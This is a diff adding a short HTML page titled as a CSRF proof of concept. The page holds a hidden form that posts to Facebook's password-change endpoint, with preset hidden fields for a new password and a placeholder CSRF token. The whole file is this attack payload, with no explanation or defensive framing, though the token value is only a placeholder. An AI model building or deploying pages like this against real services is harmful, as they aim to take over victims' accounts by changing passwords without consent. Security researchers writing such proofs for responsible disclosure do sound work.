@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC </title>
+</head>
+<body>
+    <h1>CSRF Proof </h1>
+    <form action="https://accountscenter.facebook.com/password_and_security/password/change" method="POST">
+        <input type="hidden" name="new_password" value="malicious_password">
+        <input type="hidden" name="fb_csrf_token" value="malicious_csrf_token">
+        <button type="submit">Change Password</button>
+    </form>
+</body>
+</html>
